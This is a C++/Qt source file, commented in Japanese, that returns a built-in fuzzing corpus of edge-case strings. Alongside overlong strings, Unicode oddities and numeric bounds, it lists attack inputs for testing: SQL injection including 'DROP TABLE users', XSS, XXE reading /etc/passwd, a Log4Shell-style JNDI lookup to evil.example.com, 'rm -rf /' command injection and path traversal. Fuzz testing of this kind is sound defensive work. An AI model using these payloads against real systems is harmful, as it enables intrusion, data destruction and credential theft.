#include "FuzzStringDefaults.h"

namespace FuzzStringDefaults
{
QStringList builtInCorpus()
{
    QStringList list;

    // -- 長大文字列（バッファオーバーフロー・表示崩れの確認用） --
    list << QString(256, QLatin1Char('A'));
    list << QString(1024, QLatin1Char('A'));
    list << QString(8192, QLatin1Char('A'));
    list << QString(65536, QLatin1Char('A'));
    list << QString(500, QLatin1Char('0'));          // 数字のみの長大文字列
    list << QStringLiteral("あ").repeated(2000);      // 全角文字の長大文字列（文字数とバイト数の差を突く）

    // -- 制御文字・改行コードインジェクション --
    list << QStringLiteral("line1\r\nline2");
    list << QStringLiteral("field1\nSet-Cookie: evil=1");
    list << QStringLiteral("a\tb\tc");
    list << QStringLiteral("\u0007\u0008\u000B\u000C\u000E\u000F");  // BEL/BS/VT/FF等の制御文字
    list << QStringLiteral("\u001B[31mred\u001B[0m");                // ANSIエスケープシーケンス

    // -- フォーマット文字列 --
    list << QStringLiteral("%s%s%s%s%s%s%s%s%s%s");
    list << QStringLiteral("%n%n%n%n%n");
    list << QStringLiteral("%x%x%x%x%x%x%x%x");
    list << QStringLiteral("{0}{1}{2}{3}{4}");
    list << QStringLiteral("${jndi:ldap://evil.example.com/a}");  // Log4Shell類似パターン
    list << QStringLiteral("{{7*7}}");                             // テンプレートインジェクション

    // -- SQLインジェクション --
    list << QStringLiteral("' OR '1'='1");
    list << QStringLiteral("' OR 1=1--");
    list << QStringLiteral("admin'--");
    list << QStringLiteral("'; DROP TABLE users;--");
    list << QStringLiteral("1' UNION SELECT NULL,NULL,NULL--");
    list << QStringLiteral("\" OR \"\"=\"");

    // -- スクリプト/HTMLインジェクション（XSS） --
    list << QStringLiteral("<script>alert(1)</script>");
    list << QStringLiteral("\"><img src=x onerror=alert(1)>");
    list << QStringLiteral("javascript:alert(1)");
    list << QStringLiteral("<svg onload=alert(1)>");
    list << QStringLiteral("&lt;script&gt;alert(1)&lt;/script&gt;");
    list << QStringLiteral("<!--#exec cmd=\"/bin/id\"-->");
    list << QStringLiteral(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>");

    // -- コマンドインジェクション --
    list << QStringLiteral("; rm -rf / ; echo pwned");
    list << QStringLiteral("`whoami`");
    list << QStringLiteral("$(whoami)");
    list << QStringLiteral("| cat /etc/passwd");
    list << QStringLiteral("& calc.exe &");
    list << QStringLiteral("|| ping -c 1 127.0.0.1 ||");

    // -- パストラバーサル --
    list << QStringLiteral("../../../../../../etc/passwd");
    list << QStringLiteral("..\\..\\..\\..\\windows\\system32\\cmd.exe");
    list << QStringLiteral("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd");
    list << QStringLiteral("file:///etc/passwd");

    // -- Windows予約語・ファイル名の境界 --
    list << QStringLiteral("CON");
    list << QStringLiteral("PRN");
    list << QStringLiteral("NUL");
    list << QStringLiteral("COM1");
    list << QStringLiteral("LPT1");
    list << QStringLiteral("file.txt.");
    list << QStringLiteral("file.txt ");

    // -- 引用符・エスケープの連続 --
    list << QStringLiteral("\"\"\"\"\"\"\"\"\"\"");
    list << QStringLiteral("''''''''''");
    list << QStringLiteral("\\\\\\\\\\\\\\\\");
    list << QStringLiteral("`````````");

    // -- 数値境界値（テキストとして入力） --
    list << QStringLiteral("-1");
    list << QStringLiteral("0");
    list << QStringLiteral("-0");
    list << QStringLiteral("2147483647");
    list << QStringLiteral("2147483648");
    list << QStringLiteral("-2147483648");
    list << QStringLiteral("9223372036854775807");
    list << QStringLiteral("99999999999999999999999999999999");
    list << QStringLiteral("1e308");
    list << QStringLiteral("NaN");
    list << QStringLiteral("Infinity");
    list << QStringLiteral("-Infinity");
    list << QStringLiteral("0x7fffffff");
    list << QStringLiteral("1,234.56");
    list << QStringLiteral("１２３");  // 全角数字「１２３」

    // -- 空白のみ・ゼロ幅のみ --
    list << QStringLiteral("    ");              // 半角スペースのみ
    list << QStringLiteral("　　　");  // 全角スペースのみ
    list << QStringLiteral("   ");  // ノーブレークスペースのみ

    // -- Unicode境界値 --
    list << QStringLiteral("‮evil‬");               // RTL override（表示順序の偽装）
    list << QStringLiteral("a​b‌c‍d");          // ゼロ幅文字の混入
    list << (QStringLiteral("e") + QString(30, QChar(0x0301)) + QStringLiteral("x"));  // 結合文字の大量連結
    list << QStringLiteral("\U0001F600\U0001F600\U0001F600");  // サロゲートペアを要する絵文字(😀x3)
    list << QStringLiteral(
        "\U0001F468‍\U0001F469‍\U0001F467‍\U0001F466");  // ZWJ結合絵文字（家族）
    list << QStringLiteral("ＡＢＣａｂｃ１２３");  // 全角英数字
    list << QStringLiteral("ﬁﬂ");  // Latin合字（大文字小文字変換バグを誘発しやすい）
    list << QStringLiteral("İstanbul");  // トルコ語の大文字I（ロケール依存の大文字小文字変換バグを誘発しやすい）
    list << QStringLiteral("ß");         // ドイツ語エスツェット（大文字化で"SS"になる等の非対称変換）
    list << QStringLiteral("لا العربية");  // アラビア語（右書き）
    list << QStringLiteral("���");  // 置換文字そのもの（不正シーケンスの結果を模す）

    // -- 絵文字のみを大量に（フォント描画・折返し負荷の確認用） --
    list << QStringLiteral("\U0001F600").repeated(50);

    return list;
}
}
